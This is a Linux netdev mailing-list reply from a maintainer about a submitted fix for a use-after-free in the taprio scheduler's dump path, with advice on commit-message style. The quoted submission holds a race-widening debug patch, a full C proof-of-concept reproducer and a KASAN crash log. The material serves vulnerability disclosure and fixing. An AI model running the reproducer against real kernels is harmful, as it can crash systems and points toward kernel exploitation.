Return-Path: <netdev+bounces-61295-lists+netdev=lfdr.de@vger.kernel.org>
X-Original-To: lists+netdev@lfdr.de
Delivered-To: lists+netdev@lfdr.de
Received: from ny.mirrors.kernel.org (ny.mirrors.kernel.org [147.75.199.223])
	by mail.lfdr.de (Postfix) with ESMTPS id A58578231AA
	for <lists+netdev@lfdr.de>; Wed,  3 Jan 2024 17:57:37 +0100 (CET)
Received: from smtp.subspace.kernel.org (wormhole.subspace.kernel.org [52.25.139.140])
	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
	(No client certificate requested)
	by ny.mirrors.kernel.org (Postfix) with ESMTPS id A80011C23A68
	for <lists+netdev@lfdr.de>; Wed,  3 Jan 2024 16:57:36 +0000 (UTC)
Received: from localhost.localdomain (localhost.localdomain [127.0.0.1])
	by smtp.subspace.kernel.org (Postfix) with ESMTP id 737B61BDF4;
	Wed,  3 Jan 2024 16:57:10 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=intel.com header.i=@intel.com header.b="FkAv3/0R"
X-Original-To: netdev@vger.kernel.org
Received: from mgamail.intel.com (mgamail.intel.com [198.175.65.11])
	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 393C41BDE9
	for <netdev@vger.kernel.org>; Wed,  3 Jan 2024 16:57:07 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=intel.com
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=intel.com
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/simple;
  d=intel.com; i=@intel.com; q=dns/txt; s=Intel;
  t=1704301027; x=1735837027;
  h=from:to:cc:subject:in-reply-to:references:date:
   message-id:mime-version;
  bh=919Ji5xKUkKJKpg5kvKscZXyhFfsvowtcyatxw7TEws=;
  b=FkAv3/0RWqRkKx4y1UUaiSVwK3ZKvrani7PS9FrHoZD5C6olUjlRJs6Z
   014/PECIkD3XRm2oiNEpb1Q76Z5hMwmLLHik3dpbEEFRQwImw0M9S7jmr
   03irkjzAnGVwWLthcJUEXwNimHjbnekiVTj72ddm70dzb7lgyt7wp4zV7
   okuSG7MqtAPDg9cdF93T6bpaYzdGRLdvVpmVAGTfTDugWHAURN30FkRV6
   cdAcTQ5DqdkrTv0IG1Freft4+MerPAwLWV81cNZ+w/+ou24r8MgXCUtQm
   GBbFaKToUFzYppZB7YqI435xi6YEmqx655j0Uu6yWsaDrtuL/ycbbNG25
   g==;
X-IronPort-AV: E=McAfee;i="6600,9927,10942"; a="3802041"
X-IronPort-AV: E=Sophos;i="6.04,328,1695711600"; 
   d="scan'208";a="3802041"
Received: from fmviesa001.fm.intel.com ([10.60.135.141])
  by orvoesa103.jf.intel.com with ESMTP/TLS/ECDHE-RSA-AES256-GCM-SHA384; 03 Jan 2024 08:57:06 -0800
X-ExtLoop1: 1
X-IronPort-AV: E=Sophos;i="6.04,328,1695711600"; 
   d="scan'208";a="22163251"
Received: from cpeddyx-mobl.amr.corp.intel.com (HELO vcostago-mobl3) ([10.209.175.64])
  by smtpauth.intel.com with ESMTP/TLS/ECDHE-RSA-AES256-GCM-SHA384; 03 Jan 2024 08:57:04 -0800
From: Vinicius Costa Gomes <vinicius.gomes@intel.com>
To: Team p0pk3rn <bob.p0pk3rn@gmail.com>
Cc: netdev@vger.kernel.org, edumazet@google.com, Team p0pk3rn
 <bob.p0pk3rn@gmail.com>
Subject: Re: [PATCH] net/sched: taprio: fix use-after-free in taprio_dump
In-Reply-To: <20240103023348.71473-1-bob.p0pk3rn@gmail.com>
References: <20240103023348.71473-1-bob.p0pk3rn@gmail.com>
Date: Wed, 03 Jan 2024 13:57:00 -0300
Message-ID: <8734ve5p9f.fsf@intel.com>
Precedence: bulk
X-Mailing-List: netdev@vger.kernel.org
List-Id: <netdev.vger.kernel.org>
List-Subscribe: <mailto:netdev+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:netdev+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
Content-Type: text/plain

Hi,

Team p0pk3rn <bob.p0pk3rn@gmail.com> writes:

> Hi, We suggest patch for fixing use-after-free in taprio_dump.
>
> If it has old sched_gate_list structure in taprio_dump function and the object gets freed by taprio_free_sched_cb,
> freed sched_gate_list structure can be used while replacing oper_sched in switch_schedules.
> Followings are race scenario, poc, patch and header file for poc, KASAN crash log, and suggested patch.
> We suggest applying rcu patch on dereferencing the structure like in commit, taprio: Add support adding an admin schedule (a3d43c0d56f1)
>
>
> switch_schedules                                                             taprio_dump
>
>                                                                              oper = rtnl_dereference(q->oper_sched);
> rcu_assign_pointer(q->oper_sched, *admin);
> rcu_assign_pointer(q->admin_sched, NULL);
> call_rcu(&(*oper)->rcu, taprio_free_sched_cb);
> kfree(sched);
>                                                                              if (oper && taprio_dump_tc_entries(skb, q, oper))
>                                                                              if (nla_put_u32(skb, TCA_TAPRIO_TC_ENTRY_MAX_SDU, sched->max_sdu[tc])) // UAF
>
>

Please follow the guidelines for the commit message here:

https://docs.kernel.org/process/submitting-patches.html#describe-your-changes

Consistency in formatting and language used in the commit message help a
lot when understanding the fix in the future.

There are a few rules associated with you signing off the patch, take a
look here:
https://docs.kernel.org/process/submitting-patches.html#sign-your-work-the-developer-s-certificate-of-origin

Some other tips:
 - use the output of script/get_maintainer.pl when adding the
 maintainers;
 - Also check checkpatch.pl errors/warnings, and fix them (I think you
 would see some errors related about the commit message formatting/long
 lines);
 
About the commit message, we are more interested in you showing/proving
that this is the correct fix. In this case, I am interested in a better
explanation about why we should mark the dump side as a "rcu_read
critical" vs. depending on the rtnl lock.

The patch that you used to reproduce the crash more consistently is
interesting, but could be minimized or only explained. Or a link to a
github gist/similar, and added to the notes/cover letter.

The userspace reproducer can be only a link in the commit message, or,
even better, in the "notes"/cover letter of the patch.

The KASAN report is important, it should be included, as you already
did.

Now, about the code itself, from my mental model (a bit slower than
usual after the holidays), it looks fine, but I look forward for
improved details in the commit message, to see if I am missing anything.

Sorry for the long email. Hope it helped.

> poc.patch:
> ```
> diff --git a/net/sched/sch_taprio.c b/net/sched/sch_taprio.c
> index 31a8252bd09c..48138a8a59a8 100644
> --- a/net/sched/sch_taprio.c
> +++ b/net/sched/sch_taprio.c
> @@ -980,6 +980,8 @@ static enum hrtimer_restart advance_sched(struct hrtimer *timer)
>  		/* Set things so the next time this runs, the new
>  		 * schedule runs.
>  		 */
> +		printk(KERN_ALERT "[CPU:%d] advance_sched -> switch_schedules (current->comm: %s)\n", smp_processor_id(), current->comm);
> +		mdelay(10);
>  		end_time = sched_base_time(admin);
>  		switch_schedules(q, &admin, &oper);
>  	}
> @@ -2396,7 +2398,7 @@ static int taprio_dump(struct Qdisc *sch, struct sk_buff *skb)
>  
>  	oper = rtnl_dereference(q->oper_sched);
>  	admin = rtnl_dereference(q->admin_sched);
> -
> +	if(!strcmp(current->comm,"poc")){printk(KERN_ALERT "[CPU:%d] taprio_dump (oper: 0x%lx)\n", smp_processor_id(), oper);ssleep(1);}
>  	mqprio_qopt_reconstruct(dev, &opt);
>  
>  	nest = nla_nest_start_noflag(skb, TCA_OPTIONS);
> ```
>
> list.h:
> ```c
> /* SPDX-License-Identifier: GPL-2.0 */
>     #ifndef __LIST_H__
>     #define __LIST_H__ 1
>     /* List and hash list stuff from kernel */
>
>     #include <stddef.h>
>
>     #define container_of(ptr, type, member) ({			\
>     	const typeof( ((type *)0)->member ) *__mptr = (ptr);	\
>     	(type *)( (char *)__mptr - offsetof(type,member) );})
>
>     struct list_head {
>     	struct list_head *next, *prev;
>     };
>
>     static inline void INIT_LIST_HEAD(struct list_head *list)
>     {
>     	list->next = list;
>     	list->prev = list;
>     }
>
>     static inline void __list_add(struct list_head *new,
>     			      struct list_head *prev,
>     			      struct list_head *next)
>     {
>     	next->prev = new;
>     	new->next = next;
>     	new->prev = prev;
>     	prev->next = new;
>     }
>
>     static inline void list_add(struct list_head *new, struct list_head *head)
>     {
>     	__list_add(new, head, head->next);
>     }
>
>     static inline void list_add_tail(struct list_head *new, struct list_head *head)
>     {
>     	__list_add(new, head->prev, head);
>     }
>
>     static inline void __list_del(struct list_head *prev, struct list_head *next)
>     {
>     	next->prev = prev;
>     	prev->next = next;
>     }
>
>     static inline void list_del(struct list_head *entry)
>     {
>     	__list_del(entry->prev, entry->next);
>     }
>
>     #define list_entry(ptr, type, member) \
>     	container_of(ptr, type, member)
>
>     #define list_first_entry(ptr, type, member) \
>     	list_entry((ptr)->next, type, member)
>
>     #define list_last_entry(ptr, type, member) \
>     	list_entry((ptr)->prev, type, member)
>
>     #define list_next_entry(pos, member) \
>     	list_entry((pos)->member.next, typeof(*(pos)), member)
>
>     #define list_prev_entry(pos, member) \
>     	list_entry((pos)->member.prev, typeof(*(pos)), member)
>
>     #define list_for_each_entry(pos, head, member)				\
>     	for (pos = list_first_entry(head, typeof(*pos), member);	\
>     	     &pos->member != (head);					\
>     	     pos = list_next_entry(pos, member))
>
>     #define list_for_each_entry_safe(pos, n, head, member)			\
>     	for (pos = list_first_entry(head, typeof(*pos), member),	\
>     		n = list_next_entry(pos, member);			\
>     	     &pos->member != (head);					\
>     	     pos = n, n = list_next_entry(n, member))
>
>     #define list_for_each_entry_reverse(pos, head, member)			\
>     	for (pos = list_last_entry(head, typeof(*pos), member);		\
>     	     &pos->member != (head);					\
>     	     pos = list_prev_entry(pos, member))
>
>     struct hlist_head {
>     	struct hlist_node *first;
>     };
>
>     struct hlist_node {
>     	struct hlist_node *next, **pprev;
>     };
>
>     static inline void hlist_del(struct hlist_node *n)
>     {
>     	struct hlist_node *next = n->next;
>     	struct hlist_node **pprev = n->pprev;
>     	*pprev = next;
>     	if (next)
>     		next->pprev = pprev;
>     }
>
>     static inline void hlist_add_head(struct hlist_node *n, struct hlist_head *h)
>     {
>     	struct hlist_node *first = h->first;
>     	n->next = first;
>     	if (first)
>     		first->pprev = &n->next;
>     	h->first = n;
>     	n->pprev = &h->first;
>     }
>
>     static inline int list_empty(const struct list_head *head)
>     {
>     	return head->next == head;
>     }
>
>     #define hlist_for_each(pos, head) \
>     	for (pos = (head)->first; pos ; pos = pos->next)
>
>
>     #define hlist_for_each_safe(pos, n, head) \
>     	for (pos = (head)->first; pos && ({ n = pos->next; 1; }); \
>     	     pos = n)
>
>     #define hlist_entry_safe(ptr, type, member) \
>     	({ typeof(ptr) ____ptr = (ptr); \
>     	   ____ptr ? hlist_entry(____ptr, type, member) : NULL; \
>     	})
>
>     #define hlist_for_each_entry(pos, head, member)				\
>     	for (pos = hlist_entry_safe((head)->first, typeof(*(pos)), member);\
>     	     pos;							\
>     	     pos = hlist_entry_safe((pos)->member.next, typeof(*(pos)), member))
>
>     #endif /* __LIST_H__ */
> 	```
>
> poc.c:
> ```c
>     #include <stdio.h>
>     #include <asm/types.h>
>     #include <sys/types.h>
>     #include <linux/pkt_sched.h>
>     #include <linux/netlink.h>
>     #include <linux/rtnetlink.h>
>     #include <sys/socket.h>
>     #include <string.h>
>     #include <errno.h>
>     #include <unistd.h>
>     #include <pthread.h>
>     #include <stdlib.h>
>     #include <sys/prctl.h>
>     #include <stdint.h>
>     #include "list.h"
>
>     #ifndef max
>     #define max(a,b) (((a) > (b)) ? (a) : (b))
>     #endif
>
>     #define TCA_TAPRIO_ATTR_TC_ENTRY 12
>
>     enum {
>     	TCA_TAPRIO_TC_ENTRY_UNSPEC,
>     	TCA_TAPRIO_TC_ENTRY_INDEX,		/* u32 */
>     	TCA_TAPRIO_TC_ENTRY_MAX_SDU,		/* u32 */
>     	TCA_TAPRIO_TC_ENTRY_FP,			/* u32 */
>
>     	/* add new constants above here */
>     	__TCA_TAPRIO_TC_ENTRY_CNT,
>     	TCA_TAPRIO_TC_ENTRY_MAX = (__TCA_TAPRIO_TC_ENTRY_CNT - 1)
>     };
>
>     #define DEV_INDEX 2 // dev->num_tx_queues > 1
>     #define TCA_BUF_MAX	(64*1024)
>     #define NLMSG_TAIL(nmsg) \
>     	((struct rtattr *) (((void *) (nmsg)) + NLMSG_ALIGN((nmsg)->nlmsg_len)))
>
>     struct sched_entry {
>     	struct list_head list;
>     	uint32_t index;
>     	uint32_t interval;
>     	uint32_t gatemask;
>     	uint8_t cmd;
>     };
>
>     struct req {
>       struct nlmsghdr nl;
>       struct tcmsg tc;
>       char buf[TCA_BUF_MAX];
>     };
>
>     int addattr_l(struct nlmsghdr *n, int maxlen, int type, const void *data,
>     	      int alen)
>     {
>     	int len = RTA_LENGTH(alen);
>     	struct rtattr *rta;
>
>     	if (NLMSG_ALIGN(n->nlmsg_len) + RTA_ALIGN(len) > maxlen) {
>     		fprintf(stderr,
>     			"addattr_l ERROR: message exceeded bound of %d\n",
>     			maxlen);
>     		return -1;
>     	}
>     	rta = NLMSG_TAIL(n);
>     	rta->rta_type = type;
>     	rta->rta_len = len;
>     	if (alen)
>     		memcpy(RTA_DATA(rta), data, alen);
>     	n->nlmsg_len = NLMSG_ALIGN(n->nlmsg_len) + RTA_ALIGN(len);
>     	return 0;
>     }
>
>     struct rtattr *addattr_nest(struct nlmsghdr *n, int maxlen, int type)
>     {
>     	struct rtattr *nest = NLMSG_TAIL(n);
>
>     	addattr_l(n, maxlen, type, NULL, 0);
>     	return nest;
>     }
>
>     int addattr_nest_end(struct nlmsghdr *n, struct rtattr *nest)
>     {
>     	nest->rta_len = (void *)NLMSG_TAIL(n) - (void *)nest;
>     	return n->nlmsg_len;
>     }
>
>     static struct sched_entry *create_entry(uint32_t gatemask, uint32_t interval, uint8_t cmd)
>     {
>     	struct sched_entry *e;
>
>     	e = calloc(1, sizeof(*e));
>     	if (!e)
>     		return NULL;
>
>     	e->gatemask = gatemask;
>     	e->interval = interval;
>     	e->cmd = cmd;
>
>     	return e;
>     }
>
>     static int add_sched_list(struct list_head *sched_entries, struct nlmsghdr *n)
>     {
>     	struct sched_entry *e;
>
>     	list_for_each_entry(e, sched_entries, list) {
>     		struct rtattr *a;
>
>     		a = addattr_nest(n, 1024, TCA_TAPRIO_SCHED_ENTRY);
>
>     		addattr_l(n, 1024, TCA_TAPRIO_SCHED_ENTRY_CMD, &e->cmd, sizeof(e->cmd));
>     		addattr_l(n, 1024, TCA_TAPRIO_SCHED_ENTRY_GATE_MASK, &e->gatemask, sizeof(e->gatemask));
>     		addattr_l(n, 1024, TCA_TAPRIO_SCHED_ENTRY_INTERVAL, &e->interval, sizeof(e->interval));
>
>     		addattr_nest_end(n, a);
>     	}
>
>     	return 0;
>     }
>
>     int create_taprio() {
>         int fd = socket(AF_NETLINK, SOCK_RAW, NETLINK_ROUTE);
>         if(fd == -1) {
>             printf("Error in socket: %s\n", strerror(errno));
>             return -1;
>         }
>
>         struct sockaddr_nl la;
>         memset((void *)&la, 0, sizeof(struct sockaddr_nl));
>         la.nl_family = AF_NETLINK;
>         la.nl_pid = 0;
>
>         if(bind(fd, (struct sockaddr*)&la, sizeof(la)) == -1) {
>             printf("Error in bind: %s\n", strerror(errno));
>             return -1;
>         }
>
>         struct req d;
>         memset((void *)&d, 0, sizeof(struct req));
>         d.nl.nlmsg_len = NLMSG_LENGTH(sizeof(struct tcmsg));
>         d.nl.nlmsg_type = RTM_NEWQDISC;
>         d.nl.nlmsg_flags = NLM_F_REQUEST | NLM_F_DUMP | NLM_F_CREATE | NLM_F_ACK | NLM_F_REPLACE;
>         d.nl.nlmsg_seq = 0;
>         d.nl.nlmsg_pid = 0;
>
>         d.tc.tcm_family = AF_UNSPEC;
>         d.tc.tcm_ifindex = DEV_INDEX;
>         d.tc.tcm_handle = 0;
>         d.tc.tcm_parent = TC_H_ROOT;
>         d.tc.tcm_info = 0;
>
>         char data[] = "taprio";
>         addattr_l(&d.nl, sizeof(d), TCA_KIND, data, strlen(data)+1);
>
>     	struct rtattr *tail, *l;
>     	tail = NLMSG_TAIL(&d.nl);
>     	addattr_l(&d.nl, sizeof(d), TCA_OPTIONS, NULL, 0);
>
>     	clockid_t clockid = CLOCK_TAI;
>     	addattr_l(&d.nl, sizeof(d), TCA_TAPRIO_ATTR_SCHED_CLOCKID, &clockid, sizeof(clockid));
>
>     	struct tc_mqprio_qopt opt = { };
>     	opt.num_tc = 3;
>     	unsigned char prio_tc_map[] = { 2, 2, 1, 0, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2 };
>     	memcpy(&opt.prio_tc_map, prio_tc_map, sizeof(prio_tc_map));
>
>     	opt.count[0] = 1;
>     	opt.offset[0] = 0;
>     	opt.count[1] = 1;
>     	opt.offset[1] = 1;
>     	opt.count[2] = 2;
>     	opt.offset[2] = 2;
>     	
>     	addattr_l(&d.nl, sizeof(d), TCA_TAPRIO_ATTR_PRIOMAP, &opt, sizeof(opt));
>
>     	unsigned long base_time = 1528743495910289988;
>     	addattr_l(&d.nl, sizeof(d), TCA_TAPRIO_ATTR_SCHED_BASE_TIME, &base_time, sizeof(base_time));
>
>     	struct sched_entry *e;
>     	struct list_head sched_entries;
>     	INIT_LIST_HEAD(&sched_entries);
>
>     	int cmd;
>     	unsigned int mask;
>     	unsigned int interval;
>
>     	cmd = TC_TAPRIO_CMD_SET_GATES;
>     	mask = 0x01;
>     	interval = 0300000;
>     	e = create_entry(mask, interval, cmd);
>     	list_add_tail(&e->list, &sched_entries);
>
>     	cmd = TC_TAPRIO_CMD_SET_GATES;
>     	mask = 0x02;
>     	interval = 0300000;
>     	e = create_entry(mask, interval, cmd);
>     	list_add_tail(&e->list, &sched_entries);
>
>     	cmd = TC_TAPRIO_CMD_SET_GATES;
>     	mask = 0x04;
>     	interval = 0300000;
>     	e = create_entry(mask, interval, cmd);
>     	list_add_tail(&e->list, &sched_entries);
>
>     	l = addattr_nest(&d.nl, sizeof(d), TCA_TAPRIO_ATTR_SCHED_ENTRY_LIST | NLA_F_NESTED);
>
>     	add_sched_list(&sched_entries, &d.nl);
>
>     	addattr_nest_end(&d.nl, l);
>
>     	tail->rta_len = (void *) NLMSG_TAIL(&d.nl) - (void *) tail;
>
>         struct msghdr msg;
>         memset((void *)&msg, 0, sizeof(struct msghdr));
>         msg.msg_name = (void *)&la;
>         msg.msg_namelen = sizeof(la);
>
>         struct iovec iov;
>         memset((void *)&iov, 0, sizeof(struct iovec));
>         iov.iov_base = (void *)&d.nl;
>         iov.iov_len = d.nl.nlmsg_len;
>
>         msg.msg_iov = &iov;
>         msg.msg_iovlen = 1;
>
>         if(sendmsg(fd, &msg, 0) == -1) {
>             printf("Error in sendmsg: %s\n", strerror(errno));
>             return -1;
>         }
>         close(fd);
>         return 1;
>     }
>
>     int change_taprio() {
>         int fd = socket(AF_NETLINK, SOCK_RAW, NETLINK_ROUTE);
>         if(fd == -1) {
>             printf("Error in socket: %s\n", strerror(errno));
>             return -1;
>         }
>
>         struct sockaddr_nl la;
>         memset((void *)&la, 0, sizeof(struct sockaddr_nl));
>         la.nl_family = AF_NETLINK;
>         la.nl_pid = 0;
>
>         if(bind(fd, (struct sockaddr*)&la, sizeof(la)) == -1) {
>             printf("Error in bind: %s\n", strerror(errno));
>             return -1;
>         }
>
>         struct req d;
>         memset((void *)&d, 0, sizeof(struct req));
>         d.nl.nlmsg_len = NLMSG_LENGTH(sizeof(struct tcmsg));
>         d.nl.nlmsg_type = RTM_NEWQDISC;
>         d.nl.nlmsg_flags = NLM_F_REQUEST & ~NLM_F_EXCL;
>         d.nl.nlmsg_seq = 0;
>         d.nl.nlmsg_pid = 0;
>
>         d.tc.tcm_family = AF_UNSPEC;
>         d.tc.tcm_ifindex = DEV_INDEX;
>         d.tc.tcm_handle = 0x80010000;
>         d.tc.tcm_parent = TC_H_UNSPEC;
>         d.tc.tcm_info = 0;
>
>         char data[] = "taprio";
>         addattr_l(&d.nl, sizeof(d), TCA_KIND, data, strlen(data)+1);
>
>     	struct rtattr *tail, *l;
>     	tail = NLMSG_TAIL(&d.nl);
>     	addattr_l(&d.nl, sizeof(d), TCA_OPTIONS, NULL, 0);
>
>     	clockid_t clockid = CLOCK_TAI;
>     	addattr_l(&d.nl, sizeof(d), TCA_TAPRIO_ATTR_SCHED_CLOCKID, &clockid, sizeof(clockid));
>
>     	struct tc_mqprio_qopt opt = { };
>     	opt.num_tc = 3;
>     	unsigned char prio_tc_map[] = { 2, 2, 1, 0, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2 };
>     	memcpy(&opt.prio_tc_map, prio_tc_map, sizeof(prio_tc_map));
>
>     	opt.count[0] = 1;
>     	opt.offset[0] = 0;
>     	opt.count[1] = 1;
>     	opt.offset[1] = 1;
>     	opt.count[2] = 2;
>     	opt.offset[2] = 2;
>     	
>     	addattr_l(&d.nl, sizeof(d), TCA_TAPRIO_ATTR_PRIOMAP, &opt, sizeof(opt));
>
>     	unsigned long base_time = 1528743495910289988;
>     	addattr_l(&d.nl, sizeof(d), TCA_TAPRIO_ATTR_SCHED_BASE_TIME, &base_time, sizeof(base_time));
>
>     	struct sched_entry *e;
>     	struct list_head sched_entries;
>     	INIT_LIST_HEAD(&sched_entries);
>
>     	int cmd;
>     	unsigned int mask;
>     	unsigned int interval;
>
>     	cmd = TC_TAPRIO_CMD_SET_GATES;
>     	mask = 0x01;
>     	interval = 0300000;
>     	e = create_entry(mask, interval, cmd);
>     	list_add_tail(&e->list, &sched_entries);
>
>     	cmd = TC_TAPRIO_CMD_SET_GATES;
>     	mask = 0x02;
>     	interval = 0300000;
>     	e = create_entry(mask, interval, cmd);
>     	list_add_tail(&e->list, &sched_entries);
>
>     	cmd = TC_TAPRIO_CMD_SET_GATES;
>     	mask = 0x04;
>     	interval = 0300000;
>     	e = create_entry(mask, interval, cmd);
>     	list_add_tail(&e->list, &sched_entries);
>
>     	l = addattr_nest(&d.nl, sizeof(d), TCA_TAPRIO_ATTR_SCHED_ENTRY_LIST | NLA_F_NESTED);
>
>     	add_sched_list(&sched_entries, &d.nl);
>
>     	addattr_nest_end(&d.nl, l);
>
>     	tail->rta_len = (void *) NLMSG_TAIL(&d.nl) - (void *) tail;
>
>         struct msghdr msg;
>         memset((void *)&msg, 0, sizeof(struct msghdr));
>         msg.msg_name = (void *)&la;
>         msg.msg_namelen = sizeof(la);
>
>         struct iovec iov;
>         memset((void *)&iov, 0, sizeof(struct iovec));
>         iov.iov_base = (void *)&d.nl;
>         iov.iov_len = d.nl.nlmsg_len;
>
>         msg.msg_iov = &iov;
>         msg.msg_iovlen = 1;
>
>         if(sendmsg(fd, &msg, 0) == -1) {
>             printf("Error in sendmsg: %s\n", strerror(errno));
>             return -1;
>         }
>         close(fd);
>         return 1;
>     }
>
>     int main() {
>     	puts("creating taprio..");
>         create_taprio();
>     	while (1) {
>     		puts("changing taprio..");
>     		change_taprio();
>     		sleep(1);
>     	}
>         return 0;
>     }
> 	```
>
> ==================================================================
>     BUG: KASAN: slab-use-after-free in taprio_dump_tc_entries net/sched/sch_taprio.c:2306 [inline]
>     BUG: KASAN: slab-use-after-free in taprio_dump+0xb2b/0xc70 net/sched/sch_taprio.c:2420
>     Read of size 4 at addr ffff88805d203cc0 by task syz-executor.7/42004
>
>     CPU: 0 PID: 42004 Comm: syz-executor.7 Not tainted 6.7.0-rc4 #1
>     Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.15.0-1 04/01/2014
>     Call Trace:
>      <TASK>
>      __dump_stack lib/dump_stack.c:88 [inline]
>      dump_stack_lvl+0xd9/0x150 lib/dump_stack.c:106
>      print_address_description.constprop.0+0x2c/0x3c0 mm/kasan/report.c:364
>      print_report+0xab/0x250 mm/kasan/report.c:475
>      kasan_report+0xbe/0xf0 mm/kasan/report.c:588
>      taprio_dump_tc_entries net/sched/sch_taprio.c:2306 [inline]
>      taprio_dump+0xb2b/0xc70 net/sched/sch_taprio.c:2420
>      tc_fill_qdisc+0x5e6/0x1220 net/sched/sch_api.c:952
>      qdisc_notify.isra.0+0x2c1/0x330 net/sched/sch_api.c:1024
>      tc_modify_qdisc+0x7be/0x1860 net/sched/sch_api.c:1719
>      rtnetlink_rcv_msg+0x3cb/0xf10 net/core/rtnetlink.c:6558
>      netlink_rcv_skb+0x165/0x420 net/netlink/af_netlink.c:2545
>      netlink_unicast_kernel net/netlink/af_netlink.c:1342 [inline]
>      netlink_unicast+0x54d/0x810 net/netlink/af_netlink.c:1368
>      netlink_sendmsg+0x92f/0xe50 net/netlink/af_netlink.c:1910
>      sock_sendmsg_nosec net/socket.c:730 [inline]
>      __sock_sendmsg+0xda/0x180 net/socket.c:745
>      ____sys_sendmsg+0x70f/0x870 net/socket.c:2584
>      ___sys_sendmsg+0x11d/0x1b0 net/socket.c:2638
>      __sys_sendmsg+0xfe/0x1d0 net/socket.c:2667
>      do_syscall_x64 arch/x86/entry/common.c:51 [inline]
>      do_syscall_64+0x3f/0xe0 arch/x86/entry/common.c:82
>      entry_SYSCALL_64_after_hwframe+0x63/0x6b
>     RIP: 0033:0x7f56f368ed2d
>     Code: c3 e8 97 2b 00 00 0f 1f 80 00 00 00 00 f3 0f 1e fa 48 89 f8 48 89 f7 48 89 d6 48 89 ca 4d 89 c2 4d 89 c8 4c 8b 4c 24 08 0f 05 <48> 3d 01 f0 ff ff 73 01 c3 48 c7 c1 b0 ff ff ff f7 d8 64 89 01 48
>     RSP: 002b:00007f56f43e5028 EFLAGS: 00000246 ORIG_RAX: 000000000000002e
>     RAX: ffffffffffffffda RBX: 00007f56f37cbf80 RCX: 00007f56f368ed2d
>     RDX: 0000000000000000 RSI: 00000000200007c0 RDI: 0000000000000004
>     RBP: 00007f56f36f04a6 R08: 0000000000000000 R09: 0000000000000000
>     R10: 0000000000000000 R11: 0000000000000246 R12: 0000000000000000
>     R13: 000000000000000b R14: 00007f56f37cbf80 R15: 00007f56f43c5000
>      </TASK>
>
>     Allocated by task 41957:
>      kasan_save_stack+0x22/0x40 mm/kasan/common.c:45
>      kasan_set_track+0x25/0x30 mm/kasan/common.c:52
>      ____kasan_kmalloc mm/kasan/common.c:374 [inline]
>      __kasan_kmalloc+0xa2/0xb0 mm/kasan/common.c:383
>      kmalloc include/linux/slab.h:600 [inline]
>      kzalloc include/linux/slab.h:721 [inline]
>      taprio_change+0x60c/0x2870 net/sched/sch_taprio.c:1881
>      taprio_init+0x6b5/0x940 net/sched/sch_taprio.c:2134
>      qdisc_create+0x4d1/0x10b0 net/sched/sch_api.c:1326
>      tc_modify_qdisc+0x48e/0x1860 net/sched/sch_api.c:1747
>      rtnetlink_rcv_msg+0x3cb/0xf10 net/core/rtnetlink.c:6558
>      netlink_rcv_skb+0x165/0x420 net/netlink/af_netlink.c:2545
>      netlink_unicast_kernel net/netlink/af_netlink.c:1342 [inline]
>      netlink_unicast+0x54d/0x810 net/netlink/af_netlink.c:1368
>      netlink_sendmsg+0x92f/0xe50 net/netlink/af_netlink.c:1910
>      sock_sendmsg_nosec net/socket.c:730 [inline]
>      __sock_sendmsg+0xda/0x180 net/socket.c:745
>      ____sys_sendmsg+0x70f/0x870 net/socket.c:2584
>      ___sys_sendmsg+0x11d/0x1b0 net/socket.c:2638
>      __sys_sendmsg+0xfe/0x1d0 net/socket.c:2667
>      do_syscall_x64 arch/x86/entry/common.c:51 [inline]
>      do_syscall_64+0x3f/0xe0 arch/x86/entry/common.c:82
>      entry_SYSCALL_64_after_hwframe+0x63/0x6b
>
>     Freed by task 2250:
>      kasan_save_stack+0x22/0x40 mm/kasan/common.c:45
>      kasan_set_track+0x25/0x30 mm/kasan/common.c:52
>      kasan_save_free_info+0x2b/0x40 mm/kasan/generic.c:522
>      ____kasan_slab_free+0x15e/0x1c0 mm/kasan/common.c:236
>      kasan_slab_free include/linux/kasan.h:164 [inline]
>      slab_free_hook mm/slub.c:1800 [inline]
>      slab_free_freelist_hook+0x95/0x1d0 mm/slub.c:1826
>      slab_free mm/slub.c:3809 [inline]
>      __kmem_cache_free+0xc0/0x180 mm/slub.c:3822
>      rcu_do_batch+0x38c/0xd20 kernel/rcu/tree.c:2158
>      rcu_core+0x273/0x4b0 kernel/rcu/tree.c:2431
>      __do_softirq+0x1d4/0x850 kernel/softirq.c:553
>
>     Last potentially related work creation:
>      kasan_save_stack+0x22/0x40 mm/kasan/common.c:45
>      __kasan_record_aux_stack+0xbc/0xd0 mm/kasan/generic.c:492
>      __call_rcu_common.constprop.0+0x99/0x790 kernel/rcu/tree.c:2681
>      switch_schedules net/sched/sch_taprio.c:210 [inline]
>      advance_sched+0x5d3/0xce0 net/sched/sch_taprio.c:984
>      __run_hrtimer kernel/time/hrtimer.c:1688 [inline]
>      __hrtimer_run_queues+0x604/0xc00 kernel/time/hrtimer.c:1752
>      hrtimer_interrupt+0x320/0x7b0 kernel/time/hrtimer.c:1814
>      local_apic_timer_interrupt arch/x86/kernel/apic/apic.c:1065 [inline]
>      __sysvec_apic_timer_interrupt+0x105/0x3f0 arch/x86/kernel/apic/apic.c:1082
>      sysvec_apic_timer_interrupt+0x92/0xc0 arch/x86/kernel/apic/apic.c:1076
>      asm_sysvec_apic_timer_interrupt+0x1a/0x20 arch/x86/include/asm/idtentry.h:645
>
>     Second to last potentially related work creation:
>      kasan_save_stack+0x22/0x40 mm/kasan/common.c:45
>      __kasan_record_aux_stack+0xbc/0xd0 mm/kasan/generic.c:492
>      kvfree_call_rcu+0xfe/0x480 kernel/rcu/tree.c:3400
>      drop_sysctl_table+0x2f1/0x3b0 fs/proc/proc_sysctl.c:1508
>      unregister_sysctl_table+0x41/0x60 fs/proc/proc_sysctl.c:1529
>      neigh_sysctl_unregister+0x5f/0x80 net/core/neighbour.c:3873
